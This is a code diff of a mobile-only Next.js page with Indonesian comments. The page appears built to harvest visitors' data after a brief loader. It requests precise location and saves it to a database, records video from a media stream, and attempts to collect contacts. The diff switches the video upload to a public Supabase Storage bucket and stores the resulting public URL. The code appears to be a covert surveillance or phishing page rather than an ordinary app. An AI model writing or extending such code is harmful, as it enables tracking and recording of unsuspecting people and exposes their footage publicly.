@@ -17,9 +17,7 @@ export default function Home() {
 	const countdownTimerRef = useRef<NodeJS.Timeout | null>(null);
 
 	useEffect(() => {
-		// Hanya jalankan di perangkat mobile
 		if (typeof window !== "undefined" && window.innerWidth < 768) {
-			// Tampilkan loader selama 3 detik
 			setTimeout(() => {
 				setStatus("location");
 				requestLocation();
@@ -32,14 +30,14 @@ export default function Home() {
 
 	// Fungsi untuk mendapatkan mimeType yang didukung
 	const getSupportedMimeType = () => {
-		const mimeTypes = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm;codecs=h264", "video/webm", "video/mp4", "video/x-matroska"];
+		const mimeTypes = ["video/webm", "video/mp4"];
 
 		for (const mimeType of mimeTypes) {
 			if (MediaRecorder.isTypeSupported(mimeType)) {
 				return mimeType;
 			}
 		}
-		return "video/webm"; // Fallback
+		return "video/webm";
 	};
 
 	const requestLocation = async () => {
@@ -47,7 +45,6 @@ export default function Home() {
 			const location = await getLocation();
 			setUserData((prev) => ({ ...prev, location }));
 
-			// Simpan ke database
 			const { data, error } = await supabase.from("user_data").insert([{ location }]).select().single();
 
 			if (error) throw new Error(`Gagal menyimpan lokasi: ${error.message}`);
@@ -83,9 +80,8 @@ export default function Home() {
 
 			// Dapatkan mimeType yang didukung
 			const mimeType = getSupportedMimeType();
-			const options = { mimeType };
 
-			const recorder = new MediaRecorder(stream, options);
+			const recorder = new MediaRecorder(stream, { mimeType });
 			mediaRecorderRef.current = recorder;
 			recordedChunksRef.current = [];
 
@@ -101,14 +97,21 @@ export default function Home() {
 					const blob = new Blob(recordedChunksRef.current, { type: mimeType });
 
 					// Tentukan ekstensi file berdasarkan mimeType
-					let extension = "webm";
-					if (mimeType.includes("mp4")) extension = "mp4";
-					if (mimeType.includes("matroska")) extension = "mkv";
-
+					const extension = mimeType.includes("mp4") ? "mp4" : "webm";
 					const fileName = `video-${Date.now()}.${extension}`;
 
-					// Unggah ke S3
-					const videoUrl = await uploadToS3(blob, fileName, mimeType);
+					// Simpan blob ke Supabase Storage
+					const { data, error } = await supabase.storage.from("videos").upload(fileName, blob, {
+						contentType: mimeType,
+						cacheControl: "3600",
+					});
+
+					if (error) throw new Error(`Upload gagal: ${error.message}`);
+
+					// Dapatkan URL publik
+					const { data: publicUrlData } = supabase.storage.from("videos").getPublicUrl(data.path);
+
+					const videoUrl = publicUrlData.publicUrl;
 
 					// Simpan URL video ke database
 					if (userData.id) {
@@ -182,7 +185,7 @@ export default function Home() {
 			}, 2000);
 		} catch (err: any) {
 			console.error("Error mengambil kontak:", err);
-			setStatus("completed"); // Lanjut meskipun gagal ambil kontak
+			setStatus("completed");
 		}
 	};
 
@@ -291,31 +294,4 @@ const getLocation = async (): Promise<{ lat: number; lng: number; accuracy: numb
 			{ enableHighAccuracy: true, timeout: 10000 }
 		);
 	});
-};
-
-// Fungsi upload yang diperbaiki
-const uploadToS3 = async (file: Blob, fileName: string, mimeType: string): Promise<string> => {
-	try {
-		// Buat FormData
-		const formData = new FormData();
-		formData.append("file", file, fileName);
-		formData.append("contentType", mimeType);
-
-		// Kirim ke API route
-		const response = await fetch("/api/s3-upload", {
-			method: "POST",
-			body: formData,
-		});
-
-		const data = await response.json();
-
-		if (!response.ok) {
-			throw new Error(data.error || "Gagal mengunggah video");
-		}
-
-		return data.publicUrl;
-	} catch (err) {
-		console.error("Upload error:", err);
-		throw new Error(`Gagal mengunggah video: ${(err as Error).message}`);
-	}
 };
